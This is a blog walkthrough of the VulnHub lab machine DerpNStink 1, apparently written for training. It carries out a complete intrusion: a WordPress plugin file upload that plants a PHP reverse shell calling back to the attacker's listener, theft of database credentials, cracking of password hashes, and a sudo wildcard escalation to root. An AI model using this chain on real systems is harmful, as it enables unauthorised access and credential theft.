---
title: VulnHub - DerpNStink 1
author: ret2x
date: 2021-08-15 16:11:00 +0800
categories: [Walkthrough, VulnHub]
tags: [vulnhub, wordpress]
image:
    path: /assets/images/derpnstink/front.png
---

**Description:** A linux machine hosting a Wordpress CMS whose plugin is vulnerable to an Arbitrary File Upload. Weak passwords an sudo misconfigurations allowed gaining root privileges.

**Author:** Bryan Smith

**Operating System:** Linux

**Download:** [https://www.vulnhub.com/entry/derpnstink-1,221/](https://www.vulnhub.com/entry/derpnstink-1,221/)

## Information Gathering
### Host Discovery

We start to dicover our target machine with arp-scan.

```console
root@kali:~$ arp-scan -I vmnet1 192.168.179.1/24
Interface: vmnet1, type: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
WARNING: host part of 192.168.179.1/24 is non-zero
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.179.147 00:0c:29:75:19:b9       VMware, Inc.
192.168.179.254 00:50:56:e6:64:bd       VMware, Inc.
```

### Port Scanning

Now that we have the IP address of the target machine, I proceed to perform a full TCP port scan.

```console
root@kali:~$ nmap -n -vv -T4 -p- 192.168.179.147 -oG nmap-tcp-ports.txt
...
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
...
```

### Service Enumeration

With nmap I do version detection of the open ports and script scanning.

```console
root@kali:~$ nmap -sV -sC -n -Pn -vv -p21,22,80 192.168.179.147 -oN servivce-enum.txt
...
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.2
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAMZoT7661ewMcQgzna/qzvkfYaLGwfMnL0VKh3hkBCwGw3jvSXjmjhKw/gR2TnTLFQ9eTDNPTuGsm87dOUSEunbZMvP9GgnA9hOUCI9T1oy5Rs4/AidB9uiVAKN+mefOBBkwh
O74UkzNCZw+SX214uaEyK5tQxcROT8hqqLPbu2lAAAAFQCYTgxWroPZExKzHRqCJUbgQaCV6wAAAIEAifRo93uYV4W0l81ybohh+U2vZdqF7FLMXpyvVLv3wcSs1fa6w+0idZ076luA/RWcO/Cavp1q2Yvvyp7E/uKP
e9fuDV8Qp4g3FArPQB/Bg+CUL90tNLcAiI+0b6lS8ByfwgMzcinP8fzjWeo3ZRyyU+nGqQaoF9kC951bloDJ48sAAACASzBGZ/bwnBU0oZxhuDg4c2YxD+R96JWBvDvMrqlxqZO1NsAAq5o/GU26++Yrk15mXFZgtkV
BxeFXSErjwPkHfMWqY/TNOybUptUtnrqQlvN8tB4VW9sJwbT1AmnAyJZRJZ00x8cxzqvgD6qRyPJCCdNQsUiAnpDQ8RQ5v0cY67M=
|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCog1WR41f7pXHcoQcEEDgeARy4bpquU6qGdWxOoc7CSjatxW2e8qi3Le/66/nER15eOFqFXV6dQcS/FQOqjPYtRugPNL16Idrq6BBRhmle+AUCb2Yjwq3rzPnOz
onFj2q5FSi6zzMIhTbrIwB8xF9rEazw/4DInYKCChtN7+xZC5SWk5tXf9/2hrWhvEg8mM0HYjs31SkfO2qn4OyV6/rT+sPts39ILVLN7p8IiOU8vFdbOt4K5xPgTlUIFdHotVHjkakgYZ2cb32DCu/c/qZ3xRU2kcTL
2qjL4Q6crDajXWBpyNGyFhjx88hindUTU6I6BnaWCjaDFabk7JODrf8J
|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPbUzlHO4L0CcRTLxyaFkqvqoQikn5j1oipMTeYmvIp4D3o7Ht4tvVG9H+hGyX2+jz5cHwx9knygVi9CuXDU9t4=
|   256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK5AF6Fe/U78KCW1vdVjGoYR9NHOpICUnz6uQgVGETII
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 2 disallowed entries  
|_/php/ /temporary/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: DeRPnStiNK
...
```

### Web Enumeration

We focus on the web server, viewing the source code of the page we see the path to the file **info.txt**, we access it, it contains a note specifying that the hosts file must be updated.

![](/assets/images/derpnstink/screenshot-1.png)

![](/assets/images/derpnstink/screenshot-2.png)

![](/assets/images/derpnstink/screenshot-3.png)

We access to the **webnotes** directory and identify that there's a **stinky** user, a local mail and the path to the web root.

![](/assets/images/derpnstink/screenshot-4.png)

Then we enter the domain name and the ip address in the hosts file.

```console
root@kali:~$ echo '192.168.179.147 derpnstink.local' >> /etc/hosts
```

I access to the **robots.txt** file and we see two directories, the php directory contains a phpmyadmin but to access we need the mysql credentials, so I decided to run dirb to find hidden files and web directories in the document root of the page.

![](/assets/images/derpnstink/screenshot-5.png)

```console
root@kali:~$ dirb http://derpnstink.local/ 
...                                      
==> DIRECTORY: http://derpnstink.local/css/  
+ http://derpnstink.local/index.html (CODE:200|SIZE:1298) 
==> DIRECTORY: http://derpnstink.local/javascript/    
==> DIRECTORY: http://derpnstink.local/js/         
==> DIRECTORY: http://derpnstink.local/php/     
+ http://derpnstink.local/robots.txt (CODE:200|SIZE:53)  
+ http://derpnstink.local/server-status (CODE:403|SIZE:296)
==> DIRECTORY: http://derpnstink.local/temporary/     
==> DIRECTORY: http://derpnstink.local/weblog/  
...
```

In the output we can see the **weblog** directory, we access it and we find a wordpress CMS.

![](/assets/images/derpnstink/screenshot-6.png)

Then I run wpscan to detect users and possible vulnerable plugins and themes.

```console
root@kali:~$ wpscan --url http://derpnstink.local/weblog/ -e ap,at,u
...
[+] WordPress version 4.6.9 identified (Insecure, released on 2017-11-29).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://derpnstink.local/weblog/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.6.9'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://derpnstink.local/weblog/, Match: 'WordPress 4.6.9'
 ...
 [+] slideshow-gallery
 | Location: http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/ 
 | Last Updated: 2021-07-12T16:41:00.000Z
 | [!] The version is out of date, the latest version is 1.7.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.4.6 (100% confidence)
 ...
 [+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
 ...
```

In the result we see the slideshow plugin version 1.4.6 and the admin user, I try to login to the web page with the **admin** username and password and I have successfull access.

![](/assets/images/derpnstink/screenshot-7.png)

![](/assets/images/derpnstink/screenshot-8.png)

The Slideshow Gallery plugin version 1.4.6 is vulnerable to Arbitrary File Upload as we can see in the following search with searchsploit. 

```console
root@kali:~$ searchsploit wordpress slideshow 1.4.6
----------------------------------------------------------------------- ----------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ----------------------------
WordPress Plugin Slideshow Gallery 1.4.6 - Arbitrary File Upload       | php/webapps/34514.txt
WordPress Plugin Slideshow Gallery 1.4.6 - Arbitrary File Upload       | php/webapps/34681.txt
----------------------------------------------------------------------- ----------------------------
```

## Exploitation
### Arbitrary File Upload

To exploit this vulnerability we access to **Slideshow -> Manage Slides** and click on edit in one of these.

![](/assets/images/derpnstink/screenshot-9.png)

![](/assets/images/derpnstink/screenshot-10.png)

Then we copy the pentestmonkey reverse shell to our current directory and change the the IP address for to ours and the port.

```console
root@kali:~$ cp /usr/share/webshells/php/php-reverse-shell.php shell.php
root@kali:~$ sed -i 's/127.0.0.1/192.168.179.1/;s/1234/443/' shell.php
```

First we intercept the request with burpsuite and then we click **Save Slide**, in the **filename** field we change it to the name of our backdoor and after we enter the malicious PHP code, as shown below:

![](/assets/images/derpnstink/screenshot-11.png)

As we see the change was successful.

![](/assets/images/derpnstink/screenshot-12.png)

Then we set up a netcat listener on the attacking machine and execute the curl request.

```console
root@kali:~$ curl derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/evil.php
```

And we have a shell, then we spawn for a pseudo TTY shell, as shown below:

```console
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.147] 60708
Linux DeRPnStiNK 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 athlon i686 GNU/Linux
 23:55:02 up  2:26,  0 users,  load average: 0.12, 0.07, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@DeRPnStiNK:/$ hostname
hostname
DeRPnStiNK
```

After we list the MySQL credentials for the wordpress CMS.

```console
www-data@DeRPnStiNK:/var/www/html/weblog$ cat wp-config.php
...
define('DB_NAME', 'wordpress');                     
                                                    
/** MySQL database username */                 
define('DB_USER', 'root');                 
                                       
/** MySQL database password */                  
define('DB_PASSWORD', 'mysql');                  
                                            
/** MySQL hostname */                       
define('DB_HOST', 'localhost');
...
```

Then we list the credentials of the wordpress users.

```console
www-data@DeRPnStiNK:/var/www/html/weblog$ mysql -u root -p
mysql -u root -p     
Enter password: mysql
mysql> show databases;   
show databases;            
+--------------------+         
| Database           |              
+--------------------+       
| information_schema |        
| mysql              |     
| performance_schema |       
| phpmyadmin         |      
| wordpress          |   
+--------------------+         
5 rows in set (0.09 sec)
mysql> use wordpress;
Database changed                    
mysql> select user_login,user_pass from wp_users;
select user_login,user_pass from wp_users;
+-------------+------------------------------------+
| user_login  | user_pass                          |
+-------------+------------------------------------+
| unclestinky | $P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41 |
| admin       | $P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/ |
+-------------+------------------------------------+
2 rows in set (0.00 sec)
```

We copy the password hash from unclestinky to crack it.

```console
root@kali:~$ echo '$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41' > mysql_hash.txt
root@kali:~$ zcat /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
```

We run hashcat to crack the hash and after a minutes we have the password.

```console
root@kali:~$ hashcat -a 0 -m 400 mysql_hash.txt rockyou.txt
...
$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41:wedgie57
```

I switch to the **stinky** user, in the Documents directory I found the **derpissues.pcap** file, I move this file to the **/var/www/html/temporary** file to download it to the attacking machine for analyze it.

```console
www-data@DeRPnStiNK:/$ su stinky
su stinky
Password: wedgie57

stinky@DeRPnStiNK:/$ id
id
uid=1001(stinky) gid=1001(stinky) groups=1001(stinky)
stinky@DeRPnStiNK:~/Documents$ cp derpissues.pcap /var/www/html/temporary 
```

Then I download the pcap file, analyzing it I find the credentials for the user **mrderp**, this user has logged into the wordpress page.

```console
root@kali:~$ wget derpnstink.local/temporary/derpissues.pcap
root@kali:~$ tshark -r derpissues.pcap -Y 'http.request.method==POST' -T fields -e text 2>/dev/null | grep 'mrderp' | tail -1 
Timestamps,POST /weblog/wp-login.php HTTP/1.1\r\n,\r\n,Form item: "log" = "mrderp",Form item: "pwd" = "derpderpderpderpderpderpderp",Form item: "wp-submit" = "Log In",Form item: "redirect_to" = "http://derpnstink.local/weblog/wp-admin/",Form item: "testcookie" = "1"
```

## Privilege Escalation
### Weak Passwords

I switch to the **mrderp** user, this has sudo permissions to run a script in the binaries directory.

```console
stinky@DeRPnStiNK:~$ su mrderp
su mrderp
Password: derpderpderpderpderpderpderp

mrderp@DeRPnStiNK:/home/stinky$ id
id
uid=1000(mrderp) gid=1000(mrderp) groups=1000(mrderp)
mrderp@DeRPnStiNK:/support$ sudo -l
sudo -l
[sudo] password for mrderp: derpderpderpderpderpderpderp                       

Matching Defaults entries for mrderp on DeRPnStiNK:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mrderp may run the following commands on DeRPnStiNK:
    (ALL) /home/mrderp/binaries/derpy*
```

### Sudo Permissions

To escalate to root we create the binaries directory, then in this we create the derpy file that contains the /bin/bash instruction, we give the script execution permission, we execute it and we get root.

```console
mrderp@DeRPnStiNK:~$ mkdir binaries
mkdir binaries
mrderp@DeRPnStiNK:~$ echo '/bin/bash' > binaries/derpy
echo '/bin/bash' > binaries/derpy
mrderp@DeRPnStiNK:~$ chmod +x binaries/derpy
chmod +x binaries/derpy
mrderp@DeRPnStiNK:~$ sudo /home/mrderp/binaries/derpy
sudo /home/mrderp/binaries/derpy
root@DeRPnStiNK:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```

